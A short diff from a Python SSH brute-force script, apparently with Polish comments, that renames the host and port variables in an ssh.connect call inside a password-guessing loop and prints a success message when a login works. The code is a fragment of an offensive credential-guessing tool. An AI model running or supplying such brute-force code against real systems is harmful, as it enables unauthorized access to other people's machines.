@@ -79,7 +79,7 @@ def BruteForce(port):
             print("problem z banerem")
             time.sleep(10)
             try:
-                ssh.connect(targetIP, targetPort, user, passowrd, timeout=1)
+                ssh.connect(target, port, user, passowrd, timeout=1)
                 print("[+] Udane logowanie")
             except:
                 print("end")
